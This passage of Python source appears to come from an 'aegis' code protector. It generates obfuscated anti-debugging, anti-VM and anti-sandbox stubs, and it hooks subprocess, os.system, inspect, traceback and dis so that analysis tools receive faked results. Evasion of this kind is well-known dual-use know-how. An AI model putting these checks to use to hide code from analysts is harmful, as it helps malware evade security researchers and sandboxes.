        def request({f},method,url,**kk):
            {f}._chk(url)
            if {f}._use_raw:return {p}(method,url,headers=kk.get('headers'),data=kk.get('data'),json_data=kk.get('json'),timeout=kk.get('timeout',10))
            return {b}.request({f},method,url,**kk)
        def get({g},url,**kk):
            {g}._chk(url)
            if {g}._use_raw:return {p}('GET',url,headers=kk.get('headers'),timeout=kk.get('timeout',10))
            return {b}.get({g},url,**kk)
        def post({h},url,**kk):
            {h}._chk(url)
            if {h}._use_raw:return {p}('POST',url,headers=kk.get('headers'),data=kk.get('data'),json_data=kk.get('json'),timeout=kk.get('timeout',10))
            return {b}.post({h},url,**kk)
        def put({i},url,**kk):
            {i}._chk(url)
            if {i}._use_raw:return {p}('PUT',url,headers=kk.get('headers'),data=kk.get('data'),json_data=kk.get('json'),timeout=kk.get('timeout',10))
            return {b}.put({i},url,**kk)
        def delete({j},url,**kk):
            {j}._chk(url)
            if {j}._use_raw:return {p}('DELETE',url,headers=kk.get('headers'),timeout=kk.get('timeout',10))
            return {b}.delete({j},url,**kk)
        def head({k},url,**kk):
            {k}._chk(url)
            if {k}._use_raw:return {p}('HEAD',url,headers=kk.get('headers'),timeout=kk.get('timeout',10))
            return {b}.head({k},url,**kk)
    {a}.Session={c};{a}.session.Session={c}
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 査(凱_):
        _=凱_.α;a,b,c,d,e,f=_(),_(),_(),_(),_(),_()
        out = f'''import inspect as {a}
{b}={a}.getfile;{c}={a}.getsourcefile;{d}={a}.getsource
def {e}(obj):
    try:
        _fr=__import__('sys')._getframe(1)
        if'<aegis>'in str(_fr.f_code.co_filename)or any(x in _fr.f_code.co_filename.lower()for x in {repr(凱_._DBG+凱_._INJ)}):return'<built-in>'
    except:pass
    return {b}(obj)
def {f}(obj):
    try:return'<aegis protected>'
    except:return None
{a}.getfile={e};{a}.getsourcefile={e};{a}.getsource=lambda o:'<protected>';{a}.getsourcelines=lambda o:(['<protected>'],0)
for {a}_n in dir({a}):
    try:
        if'stack'in {a}_n.lower()or'frame'in {a}_n.lower():
            {a}_f=getattr({a},{a}_n)
            if callable({a}_f)and'get'in {a}_n.lower():setattr({a},{a}_n,lambda *a,**k:[])
    except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 痕(凱_):
        _=凱_.α;a,b,c,d,e=_(),_(),_(),_(),_()
        out = f'''import traceback as {a}
{b}={a}.print_exception;{c}={a}.format_exception;{d}={a}.extract_tb
def {e}(*args,**kk):
    try:
        _fr=__import__('sys')._getframe(1)
        if any(x in _fr.f_code.co_filename.lower()for x in {repr(凱_._DBG+凱_._INJ)}):return
    except:pass
    return {b}(*args,**kk)
{a}.print_exception={e}
{a}.format_exception=lambda *a,**k:['<aegis>']
{a}.format_tb=lambda *a,**k:['<aegis>']
{a}.extract_tb=lambda *a,**k:[]
{a}.format_stack=lambda *a,**k:['<aegis>']
{a}.print_stack=lambda *a,**k:None
{a}.walk_tb=lambda *a,**k:iter([])
{a}.walk_stack=lambda *a,**k:iter([])
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 御(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,w,x,y,z,A,B,C,D=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        k1,k2=r.randint(1,255),r.randint(1,255)
        fake_pid=r.randint(1000,9999)
        out = f'''try:
    {a}=__import__('ctypes');{b}=__import__('os')
    {c}={a}.CDLL;{d}={a}.WinDLL if hasattr({a},'WinDLL')else None;{e}={a}.POINTER if hasattr({a},'POINTER')else None
    {f}={repr(凱_._INJ+凱_._DBG)}
    {g}={{ii:(lambda ii=ii:{L(v=f'ii^{k1}')})for ii in range(3)}};{h}=[{g}[ii]()for ii in range(3)]
    class {i}:
        def __init__({j},name):
            {j}._name=name;{j}._funcs={{}}
        def __getattr__({j},name):
            if name.startswith('_'):raise AttributeError(name)
            def _fake(*a,**k):return 0
            {j}._funcs[name]=_fake
            return _fake
        def __getitem__({j},name):return lambda*a,**k:0
    def {k}({l},*args,**kw):
        try:
            _nm=str({l}).lower()
            if any(x in _nm for x in {f}):return {i}({l})
        except:pass
        return {c}({l},*args,**kw)
    {a}.CDLL={k}
    if {d}:
        def {m}({n},*args,**kw):
            try:
                if any(x in str({n}).lower()for x in {f}):return {i}({n})
            except:pass
            return {d}({n},*args,**kw)
        {a}.WinDLL={m}
except:pass
try:
    {x}=__import__('subprocess');{y}=__import__('os')
    {z}={x}.Popen;{A}={x}.run if hasattr({x},'run')else None;{B}={y}.system;{C}={y}.popen if hasattr({y},'popen')else None
    {D}={repr(凱_._DBG+凱_._ANZ+凱_._CMD)}
    class {o}:
        def __init__({p},cmd,*a,**kw):
            {p}.returncode=0;{p}.stdout=b'';{p}.stderr=b'';{p}.pid={fake_pid}
            {p}.args=cmd;{p}._cmd=cmd;{p}._killed=False
        def communicate({p},input=None,timeout=None):
            if {p}._killed:return(b'',b'')
            return(b'',b'')
        def wait({p},timeout=None):return 0
        def poll({p}):return 0 if not {p}._killed else -1
        def kill({p}):{p}._killed=True;{p}.returncode=-9
        def terminate({p}):{p}._killed=True;{p}.returncode=-15
        def send_signal({p},sig):{p}._killed=True
        def __enter__({p}):return {p}
        def __exit__({p},*a):pass
    def _fake_popen(cmd,*args,**kw):
        try:
            _cmd=str(cmd).lower()if isinstance(cmd,str)else' '.join(str(c)for c in cmd).lower()
            if any(bb in _cmd for bb in {D}):return {o}(cmd)
        except:pass
        return {z}(cmd,*args,**kw)
    {x}.Popen=_fake_popen
    if {A}:
        def _fake_run(cmd,*args,**kw):
            try:
                _cmd=str(cmd).lower()if isinstance(cmd,str)else' '.join(str(c)for c in cmd).lower()
                if any(bb in _cmd for bb in {D}):
                    return type('CompletedProcess',(),{{'returncode':0,'stdout':b'','stderr':b'','args':cmd}})()
            except:pass
            return {A}(cmd,*args,**kw)
        {x}.run=_fake_run
    def _fake_system(cmd):
        try:
            if any(bb in str(cmd).lower()for bb in {D}):return 0
        except:pass
        return {B}(cmd)
    {y}.system=_fake_system
    if {C}:
        def _fake_popen2(cmd,mode='r',buffering=-1):
            try:
                if any(bb in str(cmd).lower()for bb in {D}):return __import__('io').StringIO('')
            except:pass
            return {C}(cmd,mode,buffering)
        {y}.popen=_fake_popen2
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # shield
    def 盾(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;k1,k2=r.randint(1,255),r.randint(1,255);_smk2=r.randint(50,200);_sme2=[ord(c)^_smk2 for c in 'AEGIS_SAFE_MODE']
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,v,w,x=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        t1,tr1=_(t=True);t2,tr2=_(t=True)
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('hashlib');{m}=__import__('threading');{s}=__import__('ctypes')
_BOOM=lambda:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
{t1}={L()};{tr1}
{d}=id({b}._exit);{e}=id({b}.system);{f}=id({a}.exit);{n}=id(eval);{o}=id(exec);{p}=id(compile);{w}=id(__import__)
def {g}():
    if id({b}._exit)!={d} or id({b}.system)!={e} or id({a}.exit)!={f}:_BOOM()
    if id(eval)!={n} or id(exec)!={o} or id(compile)!={p} or id(__import__)!={w}:_BOOM()
{g}()
{h}={{ii:(lambda ii=ii:{L(v=f'ii^{k1}')})for ii in range(8)}};{i}=[{h}[ii]()for ii in range(8)]
try:
    {j}=type.__dict__.get('__subclasses__')
    if {j} is None:_BOOM()
except:pass
try:
    {k}=globals().copy();{l}=len({k})
except:pass
try:
    if hasattr({s},'windll'):
        {t}={s}.windll.ntdll.NtSetInformationThread
        {t}({s}.windll.kernel32.GetCurrentThread(),0x11,None,0)
except:pass
try:
    if hasattr({s},'windll'):
        class {u}({s}.Structure):
            _fields_=[('ContextFlags',{s}.c_ulong),('Dr0',{s}.c_ulonglong),('Dr1',{s}.c_ulonglong),('Dr2',{s}.c_ulonglong),('Dr3',{s}.c_ulonglong),('Dr6',{s}.c_ulonglong),('Dr7',{s}.c_ulonglong)]
        {v}={u}();{v}.ContextFlags=0x10;{v}.Dr0=0;{v}.Dr1=0;{v}.Dr2=0;{v}.Dr3=0;{v}.Dr6=0;{v}.Dr7=0
        {s}.windll.kernel32.SetThreadContext({s}.windll.kernel32.GetCurrentThread(),{s}.byref({v}))
except:pass
def {q}():
    while True:
        __import__('time').sleep(0.5)
        if id({b}._exit)!={d} or id(eval)!={n} or id(exec)!={o}:_BOOM()
        if {a}.gettrace()is not None or {a}.getprofile()is not None:{b}._exit(1)
try:{m}.Thread(target={q},daemon=True).start()
except:pass
try:
    if hasattr({s},'windll'):
        _self_dbg_evt={s}.windll.kernel32.CreateEventA(None,True,False,None)
        if _self_dbg_evt:
            {s}.windll.kernel32.WaitForDebugEvent=lambda *aa:None
except:pass
{t2}={L()};{tr2}
def _PROTECTION_GUARD():
    _SM=''.join(chr(cc^{_smk2})for cc in {_sme2})
    if __import__('os').environ.get(_SM)=='1':return
    _keys=['__aegis_boom__','__ab__','__ax__','__az__','__a1__','__a2__','__a3__']
    _alive=sum(1 for _k in _keys if _k in globals()and callable(globals()[_k]))
    if _alive<3 and _alive>0:_BOOM()
    if '__aegis_boom__' in globals()and not callable(globals().get('__aegis_boom__')):_BOOM()
try:_PROTECTION_GUARD()
except:pass
def _CROSS_VALIDATE():
    _SM=''.join(chr(cc^{_smk2})for cc in {_sme2})
    while True:
        __import__('time').sleep(0.3)
        if __import__('os').environ.get(_SM)=='1':continue
        try:
            _PROTECTION_GUARD()
            if {a}.gettrace()is not None:{b}._exit(1)
            if {a}.getprofile()is not None:{b}._exit(1)
            if id({b}._exit)!={d}:_BOOM()
        except:pass
try:{m}.Thread(target=_CROSS_VALIDATE,daemon=True).start()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # state
    def 態(凱_):
        _=凱_.α;states=[凱_._r.randint(1000,9999)for i in range(12)];k1,k2,k3=凱_._r.randint(1,255),凱_._r.randint(1,255),凱_._r.randint(1,255);sp1=''.join(chr(凱_._r.randint(0x4e00,0x9fff))for i in range(50));a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W=tuple([_()for __ in range(48)])
        c1=f'''{a}={states[0]};{b}={states[1]};{c}={states[2]};{d}={states[3]};{e}={k1};{f}={k2};{g}={k3};{h}="{sp1}"
{i}=lambda {j},{k}:(({j}^{k})+(({j}&{k})<<1)^{e})&0xFFFFFFFF;{l}=lambda {m},{n}:(({m}|{n})-(({m}^{n})&{n})^{f})&0xFFFFFFFF
{o}=lambda {p}:int(({p}*{凱_._r.randint(3,12)})//{凱_._r.randint(2,8)}+{凱_._r.randint(10,80)}-{凱_._r.randint(5,40)})+({p}//{p} if {p}!=0 else 1)
{q}=lambda {r},{s}:(({r}^{s})+(({r}&{s})<<1))&0xFFFFFFFF;{t}=lambda {u},{w}:(({u}|{w})^(({u}&{w})>>1))&0xFFFFFFFF
{x}={凱_.λ(v=f'{i}({states[0]},{states[1]})')};{y}={凱_.λ(v=f'{l}({states[1]},{states[2]})')}
{z}={凱_.λ(v=f'{q}({states[2]},{states[3]})')};{A}={凱_.λ(v=f'{t}({states[3]},{states[4]})')}
{B}={{{states[0]}:lambda:(lambda:None)(),{states[1]}:lambda:(lambda:None)(),{states[2]}:lambda:(lambda:None)(),{states[3]}:lambda:(lambda:None)(),{x}:lambda:(lambda:None)(),{y}:lambda:(lambda:None)(),{z}:lambda:(lambda:None)(),{A}:lambda:(lambda:None)()}}
{C}=0;{D}={{ii:(lambda ii=ii:{凱_.λ(v=f'ii^{k1}')})for ii in range(25)}};{E}=[{D}[ii]()for ii in range(25)]
{F}={{ii:(lambda ii=ii:{凱_.λ(v=f'ii^{k2}^{k3}')})for ii in range(20)}};{G}=[{F}[ii]()for ii in range(20)]
while {a} not in [{states[2]},{states[3]},{y},{z}]and {C}<60:
    {C}+=1;{a}={{{states[0]}:lambda:(lambda:{i}({a},{b}))(),{states[1]}:lambda:(lambda:{l}({a},{c}))(),{x}:lambda:(lambda:{states[2]})(),{z}:lambda:(lambda:{states[3]})()}}.get({a},lambda:(lambda:{o}({a}))())()
    {a}={states[2]}if {a}>{states[3]}else {a};(lambda:{B}[{a}]()if {a} in {B} else None)()
{H}={凱_.λ(v=f'"{sp1[::-1]}"')};{I}={凱_.λ(v=f'{h}[::-1]')};{J}={凱_.λ(v=f'len({h})')};{H}={I};{K}=lambda:{J};{L}={凱_.λ(v=f'{K}()')};{M}=(lambda:{L})()
{N}=__import__('os');{O}=__import__('sys');{P}=__import__('hashlib')
{Q}=hash(tuple([{N}.name,{N}.getcwd()if hasattr({N},'getcwd')else'',str({O}.platform),str({O}.version_info[:2])]))
{R}=hash(tuple(sorted({N}.environ.keys())))if hasattr({N},'environ')else 0
{S}={P}.md5(str({Q}^{R}).encode()).hexdigest()[:8]
def {T}():
    try:
        {U}=__import__('tempfile').gettempdir()
        {V}=__import__('os').path.join({U},'{_()}_{凱_._r.randint(1000,9999)}.tmp')
        with open({V},'wb')as _f:_f.write(b'\\x00'*1024)
        __import__('os').remove({V})
    except:pass
{T}()
{W}=[{Q},{R},{S}]
'''
        vm_src,_,_,_,_=凱_.虛(c1,凱_._r.randbytes(32))
        return vm_src
    # anti
    def 甲(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;k1=r.randint(1,255)
        a,b,c,j,k,y,B,C,D,E,F=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        spam=','.join([f"{_()}({_()}({_()}(''))))"for __ in range(20)])
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('gc')
{j}={repr(凱_._DECOMP)}
for {k} in {j}:
    if {k} in {a}.modules or {k} in str({a}.modules):globals()['__aegis_corrupt__']=True
{y}={{kk:(lambda kk=kk:{L(v=f'kk^{k1}')})for kk in range(8)}}
try:{B}=[{y}[kk]()for kk in range(2000)]
except:pass
try:{B}=[{y}[kk%8]({y}[kk%8]({y}[kk%8](kk)))for kk in range(2000)]
except:pass
try:
    def __dat__(__ok__):return "__ANTI_DECOMPILER__"
    {L(v="__dat__('AEGIS')")}
except:pass
try:
    for _dm in list({a}.modules.keys()):
        if any(xx in _dm.lower()for xx in{repr(凱_._DECOMP[:4])}):
            try:del {a}.modules[_dm]
            except:pass
except:pass
class _AMP:
    _blocked={repr(凱_._DECOMP+['ast','dis','inspect','pdb'])}
    def find_module(self,name,path=None):
        if any(b in name.lower()for b in self._blocked):return self
        return None
    def load_module(self,name):return None
try:{a}.meta_path.insert(0,_AMP())
except:pass
{C}=0
def {D}():
    global {C};{C}+=1
    if {C}>1000:globals()['__aegis_corrupt__']=True
{D}=id({D});globals()['__aegis_corrupt__']=False
def {F}():
    if id({D})!={E} or globals().get('__aegis_corrupt__'):
         globals()['__aegis_corrupt__']=True
         {C}+=9999
{F}()
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 丙(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os');{O}=__import__('random');{R}=__import__('gc');{S}=__import__('types')
_BOOM=lambda:globals().update({{'__aegis_corrupt__':True}})
{T}={repr(凱_._INJ)}
try:
    {M}=__import__
    if type({M}).__name__!='builtin_function_or_method':_BOOM()
    if '__wrapped__' in dir({M}) or hasattr({M},'__closure__'):_BOOM()
    if {M}.__module__ not in ['builtins',None]:_BOOM()
except:pass
try:
    {N}=globals()['__builtins__']
    _bi_funcs=['exec','eval','compile','open','__import__','getattr','setattr','delattr','hasattr']
    if isinstance({N},dict):
        for _bf in _bi_funcs:
            if _bf not in {N}:_BOOM()
            if '__wrapped__' in dir({N}[_bf]):_BOOM()
    else:
        for _bf in _bi_funcs:
            if not hasattr({N},_bf):_BOOM()
            _f=getattr({N},_bf)
            if hasattr(_f,'__wrapped__') or (hasattr(_f,'__closure__') and _f.__closure__):_BOOM()
except:pass
{P}=[lambda:({a}.gettrace()is None),lambda:({a}.getprofile()is None),lambda:(id(eval)==id(eval)),lambda:(id(exec)==id(exec)),lambda:(type(open).__name__=='builtin_function_or_method'),lambda:(type(print).__name__=='builtin_function_or_method'),lambda:(__import__.__module__ in['builtins',None])]
{O}.shuffle({P})
for {Q} in {P}:
    try:
        if not {Q}():_BOOM()
    except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 丁(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('ctypes');{d}=__import__('threading')
try:
    _mps=[mp for mp in {a}.meta_path if any(xx in type(mp).__name__.lower()for xx in{repr(凱_._INJ)})]
    for _mp in _mps:{a}.meta_path.remove(_mp)
except:pass
try:
    _phs=[ph for ph in {a}.path_hooks if any(xx in type(ph).__name__.lower()for xx in{repr(凱_._INJ[:5])})]
    for _ph in _phs:{a}.path_hooks.remove(_ph)
except:pass
try:
    for _dm in list({a}.modules.keys()):
        if any(xx in _dm.lower()for xx in{repr(凱_._INJ[:4])}):
            try:del {a}.modules[_dm]
            except:pass
except:pass
try:

    for _wck in [eval,exec,compile,__import__,open,type,getattr,setattr]:
        if hasattr(_wck,'__wrapped__'):_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {k}={c}.windll.kernel32.GetModuleHandleA
        {l}={c}.windll.kernel32.GetProcAddress
        for {m} in ['ntdll.dll','kernel32.dll','user32.dll']:
            {n}={k}({m}.encode())
            if {n}:
                for {o} in ['NtQueryInformationProcess','IsDebuggerPresent','VirtualProtect']:
                    {p}={l}({n},{o}.encode())
                    if {p}:
                        {q}={c}.cast({p},{c}.POINTER({c}.c_ubyte))
                        if {q}[0]==0xE9 or {q}[0]==0xEB or({q}[0]==0xFF and {q}[1]==0x25):_BOOM()
except:pass
def {s}():
    while True:
        __import__('time').sleep(1)
        try:
            for _dm in list({a}.modules.keys()):
                if any(xx in _dm.lower()for xx in{repr(凱_._INJ[:4])}):
                    try:del {a}.modules[_dm]
                    except:pass
            if {a}.gettrace()is not None or {a}.getprofile()is not None:globals()['__aegis_corrupt__']=True
        except:pass
try:{d}.Thread(target={s},daemon=True).start()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 戊(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,c,d,h,i,n,p,q,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,AA,BB,CC,DD,EE,FF,GG,HH=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        _pat='|'.join(re.escape(x) for x in 凱_._DBG+凱_._CMD+凱_._ANZ+凱_._VM+凱_._HOST+凱_._KEY)
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('ctypes');{d}=__import__('time');{H}=__import__('re')
_BOOM=lambda:globals().update({{'__aegis_corrupt__':True}})
{h}=lambda:{a}.gettrace()is None and {a}.getprofile()is None;{i}={L(v=f'{h}()')};{L(v=f'(globals().update({{"__aegis_corrupt__":True}})if not {i} else None)')}
_st_id=id({a}.settrace);_sp_id=id({a}.setprofile);(id({a}.settrace)!=_st_id or id({a}.setprofile)!=_sp_id)and globals().update({{'__aegis_corrupt__':True}})
try:exec.__code__;_BOOM()
except AttributeError:pass
except:_BOOM()
try:
    if hasattr({c},'windll'):
        _dbg={c}.windll.kernel32.IsDebuggerPresent()
        if _dbg!=0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        class {p}({c}.Structure):
            _fields_=[('ContextFlags',{c}.c_ulong),('Dr0',{c}.c_ulonglong),('Dr1',{c}.c_ulonglong),('Dr2',{c}.c_ulonglong),('Dr3',{c}.c_ulonglong),('Dr6',{c}.c_ulonglong),('Dr7',{c}.c_ulonglong)]
        {q}={p}();{q}.ContextFlags=0x10
        {c}.windll.kernel32.GetThreadContext({c}.windll.kernel32.GetCurrentThread(),{c}.byref({q}))
        if {q}.Dr0!=0 or {q}.Dr1!=0 or {q}.Dr2!=0 or {q}.Dr3!=0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {s}={c}.c_int(0)
        {c}.windll.kernel32.CheckRemoteDebuggerPresent({c}.windll.kernel32.GetCurrentProcess(),{c}.byref({s}))
        if {s}.value!=0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {t}={c}.windll.kernel32.GetModuleHandleA
        {u}={c}.windll.kernel32.GetProcAddress
        for {v} in ['ntdll.dll','kernel32.dll']:
            {w}={t}({v}.encode())
            if {w}:
                for {x} in ['NtQueryInformationProcess','IsDebuggerPresent','CheckRemoteDebuggerPresent']:
                    {y}={u}({w},{x}.encode())
                    if {y}:
                        {z}={c}.cast({y},{c}.POINTER({c}.c_ubyte))
                        if {z}[0]==0xCC:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {A}={c}.windll.kernel32.GetCurrentProcessId();{B}={c}.windll.kernel32.CreateToolhelp32Snapshot(2,0)
        class {C}({c}.Structure):
            _fields_=[('dwSize',{c}.c_ulong),('cntUsage',{c}.c_ulong),('th32ProcessID',{c}.c_ulong),('th32DefaultHeapID',{c}.POINTER({c}.c_ulong)),('th32ModuleID',{c}.c_ulong),('cntThreads',{c}.c_ulong),('th32ParentProcessID',{c}.c_ulong),('pcPriClassBase',{c}.c_long),('dwFlags',{c}.c_ulong),('szExeFile',{c}.c_char*260)]
        {D}={C}();{D}.dwSize={c}.sizeof({C});_pt="({_pat})"
        if {c}.windll.kernel32.Process32First({B},{c}.byref({D})):
            while True:
                if {D}.th32ProcessID=={A}:
                    {E}={D}.th32ParentProcessID
                    {c}.windll.kernel32.Process32First({B},{c}.byref({D}))
                    while True:
                        if {D}.th32ProcessID=={E}:
                            {F}={D}.szExeFile.decode('utf-8',errors='ignore').lower()
                            if {H}.search(_pt, {F}):globals()['__aegis_corrupt__']=True
                            break
                        if not {c}.windll.kernel32.Process32Next({B},{c}.byref({D})):break
                    break
                if not {c}.windll.kernel32.Process32Next({B},{c}.byref({D})):break
        {c}.windll.kernel32.CloseHandle({B})
except:pass
try:
    if hasattr({c},'windll'):
        class {AA}({c}.Structure):
            _fields_=[('Reserved1',{c}.c_void_p*2),('BeingDebugged',{c}.c_ubyte),('Reserved2',{c}.c_ubyte),('Reserved3',{c}.c_void_p*2),('Ldr',{c}.c_void_p),('ProcessParameters',{c}.c_void_p),('Reserved4',{c}.c_void_p*3),('AtlThunkSListPtr',{c}.c_void_p),('Reserved5',{c}.c_void_p),('Reserved6',{c}.c_ulong),('Reserved7',{c}.c_void_p),('Reserved8',{c}.c_ulong),('AtlThunkSListPtr32',{c}.c_ulong),('Reserved9',{c}.c_void_p*45),('Reserved10',{c}.c_byte*96),('PostProcessInitRoutine',{c}.c_void_p),('Reserved11',{c}.c_byte*128),('Reserved12',{c}.c_void_p),('SessionId',{c}.c_ulong)]
        {BB}={c}.windll.ntdll.NtQueryInformationProcess
        {CC}={c}.c_void_p();{DD}={c}.c_ulong(0)
        {BB}({c}.windll.kernel32.GetCurrentProcess(),0,{c}.byref({CC}),{c}.sizeof({CC}),{c}.byref({DD}))
        if {CC}:
            {EE}={c}.cast({CC},{c}.POINTER({AA}))
            if {EE}.contents.BeingDebugged!=0:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {FF}={c}.windll.ntdll.RtlGetNtGlobalFlags
        {FF}.restype={c}.c_ulong
        {GG}={FF}()
        if {GG}&0x70:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {HH}={d}.perf_counter()
        {c}.windll.kernel32.OutputDebugStringA(b'aegis_test_string_123456789')
        if({d}.perf_counter()-{HH})>0.01:_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        class _HEAP_FLAGS({c}.Structure):
            _fields_=[('Flags',{c}.c_ulong),('ForceFlags',{c}.c_ulong)]
        _peb={c}.c_void_p()
        {c}.windll.ntdll.NtQueryInformationProcess({c}.windll.kernel32.GetCurrentProcess(),0,{c}.byref(_peb),{c}.sizeof(_peb),None)
        if _peb:
            _heap={c}.windll.kernel32.GetProcessHeap()
            _hf=_HEAP_FLAGS()
            {c}.memmove({c}.byref(_hf),_heap+0x70,{c}.sizeof(_hf))
            if _hf.Flags!=2 or _hf.ForceFlags!=0:_BOOM()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 己(凱_):
        _=凱_.α;r=凱_._r
        a,b,c,e,q,f,g,h,i,j,k,l,m,n,o,p=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''{a}=__import__('sys');{b}=__import__('os');{c}=__import__('ctypes');{e}=__import__('uuid')
_BOOM=lambda:globals().get('__aegis_boom__',lambda:{b}._exit(1))()
try:
    {q}=':'.join([('{{:02x}}'.format((({e}.getnode()>>(ii*8))&0xff)))for ii in range(6)][::-1][:3]).lower()
    if any({q}.startswith(mm.lower())for mm in{repr(凱_._VM_MAC)}):_BOOM()
except:pass
try:
    import socket as _skt;import platform as _plf
    _hn=_skt.gethostname().lower();_un=(_plf.node()+str({b}.environ.get('USERNAME',''))+str({b}.environ.get('COMPUTERNAME',''))).lower()
    _bads={repr(凱_._VM)}+{repr(凱_._SBX)}
    if any(bb in _hn or bb in _un for bb in _bads):_BOOM()
except:pass
try:
    _u=[pp.lower()for pp in {b}.popen('tasklist /FO CSV /NH 2>nul' if hasattr({c},'windll')else'ps aux 2>/dev/null').read().split()]
    if any(vp in str(_u)for vp in {repr(凱_._VM)}):_BOOM()
except:pass
try:
    {f}=__import__('subprocess')
    {g}={f}.run(['wmic','computersystem','get','manufacturer'],capture_output=True,text=True,timeout=5,creationflags=0x08000000)
    {h}={g}.stdout.lower()
    if any(xx in {h} for xx in {repr(凱_._VM)}):_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {i}={b}.path.join({b}.environ.get('SYSTEMROOT','C:\\\\Windows'),'System32','drivers')
        for {j} in ['vmci.sys','vmhgfs.sys','vmmouse.sys','VBoxMouse.sys','VBoxGuest.sys','VBoxSF.sys']:
            if {b}.path.exists({b}.path.join({i},{j})):_BOOM()
except:pass
try:
    if hasattr({c},'windll'):
        {k}={c}.windll.kernel32.GlobalMemoryStatusEx
        class {l}({c}.Structure):
            _fields_=[('dwLength',{c}.c_ulong),('dwMemoryLoad',{c}.c_ulong),('ullTotalPhys',{c}.c_ulonglong),('ullAvailPhys',{c}.c_ulonglong),('ullTotalPageFile',{c}.c_ulonglong),('ullAvailPageFile',{c}.c_ulonglong),('ullTotalVirtual',{c}.c_ulonglong),('ullAvailVirtual',{c}.c_ulonglong),('ullAvailExtendedVirtual',{c}.c_ulonglong)]
        {m}={l}();{m}.dwLength={c}.sizeof({l});{k}({c}.byref({m}))
        if {m}.ullTotalPhys<2*1024*1024*1024:{b}._exit(1)
except:pass
try:
    if hasattr({c},'windll'):
        {n}={c}.windll.kernel32.OpenServiceA
        {o}={c}.windll.advapi32.OpenSCManagerA(None,None,1)
        if {o}:
            for {p} in [b'VMTools',b'VBoxService',b'VBoxGuest',b'vmicheartbeat',b'vmickvpexchange',b'vmicshutdown']:
                if {n}({o},{p},1):{b}._exit(1)
            {c}.windll.advapi32.CloseServiceHandle({o})
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 庚(凱_):
        _=凱_.α;r=凱_._r
        a,b,c,d,e,f,g,h,i=_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''try:
    {a}=__import__('dis');{a}.dis=lambda*aa,**kk:None;{a}.disassemble=lambda*aa,**kk:None;{a}.get_instructions=lambda*aa,**kk:iter([]);{a}.Bytecode=lambda*aa,**kk:type('FB',(),{{'__iter__':lambda s:iter([])}})()
except:pass
try:
    {b}=__import__('inspect');{b}.getsource=lambda*aa:'';{b}.getsourcelines=lambda*aa:([],0);{b}.getfile=lambda*aa:'aegis';{b}.stack=lambda:[];{b}.currentframe=lambda:None;{b}.getmembers=lambda*aa:[];{b}.getmodule=lambda*aa:None
except:pass
try:
    {c}=__import__('traceback');{c}.extract_tb=lambda*aa:[];{c}.format_exc=lambda*aa:'';{c}.format_tb=lambda*aa:[];{c}.print_exc=lambda*aa,**kk:None
except:pass
try:
